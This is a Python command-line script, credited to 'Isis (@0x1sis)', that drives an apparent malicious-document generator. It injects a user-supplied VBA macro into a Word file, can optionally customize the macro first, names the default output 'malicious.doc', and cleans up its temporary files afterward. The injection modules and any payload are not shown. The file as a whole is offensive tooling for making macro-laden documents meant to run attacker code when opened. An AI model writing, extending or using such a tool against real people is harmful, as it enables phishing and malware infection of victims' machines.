#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Isis (@0x1sis)

import sys
import argparse
from pathlib import Path
from termcolor import colored

from src.module.doc.doc_generate import DocGenerator
from src.module.vba.vba_customisation import Customisation


def banner():
    print(colored(r"""
       ______ _                 
     / _____) |                
    ( (____ | |__   ___  _   _ 
     \____ \|  _ \ / _ \| | | |
     _____) ) | | | |_| | |_| |
    (______/|_| |_|\___/|____/ 
    by Isis (@0x1sis)
    """, 'light_grey'))


def parse_args():
    parser = argparse.ArgumentParser(
        description=colored("Generate a weaponized DOC file with a VBA macro.", "light_blue"),
        add_help=False
    )
    parser.add_argument("-h", "--help", action="help", help="Show this help message.")
    parser.add_argument("-f", "--file", help="VBA script to inject.", required=True)
    parser.add_argument("-d", "--doc", help="Optional base DOC file.", default=None)
    parser.add_argument("-c", "--custom", action="store_true", help="Customize the VBA code before injection.")
    parser.add_argument("-o", "--output", help="Output file name.", default="malicious.doc")
    return parser.parse_args()


def check_file(file: Path, allowed_ext: list):
    if not file.exists():
        print(colored(f"[!] Error: File '{file}' not found.", "red"))
        sys.exit(1)
    if file.suffix.lower() not in allowed_ext:
        print(colored(f"[!] Error: Invalid file extension for '{file}'. Allowed: {', '.join(allowed_ext)}", "red"))
        sys.exit(1)


def main():
    options = parse_args()

    vba_file = Path(options.file).resolve()
    doc_file = Path(options.doc).resolve() if options.doc else None
    output_file = Path(options.output).resolve()

    check_file(vba_file, [".vba"])
    if options.doc:
        check_file(doc_file, [".doc", ".docm", ".docx"])

    print(colored(f"[+] VBA Script input: {vba_file}", "light_green"))
    if options.doc:
        print(f"[*] DOC File input: {doc_file}")
    print(colored(f"[+] Output file: {output_file}", "light_green"))

    temp_vba_path = None

    try:
        if options.custom:
            print(colored("[*] Customizing VBA script...", "light_green"))
            customisable = Customisation(vba_file)
            temp_vba_path = customisable.modify_vba_file()
            vba_file = Path(temp_vba_path).resolve()

        generator = DocGenerator(vba_file, doc_file, output_file)
        generator.doc_generate()

        print(colored(f"[+] Final malicious document: {output_file}", "light_blue"))

    finally:
        mht_file = output_file.with_suffix(".mht")
        if mht_file.exists():
            mht_file.unlink()

        if temp_vba_path and Path(temp_vba_path).exists():
            Path(temp_vba_path).unlink()


if __name__ == "__main__":
    banner()
    main()
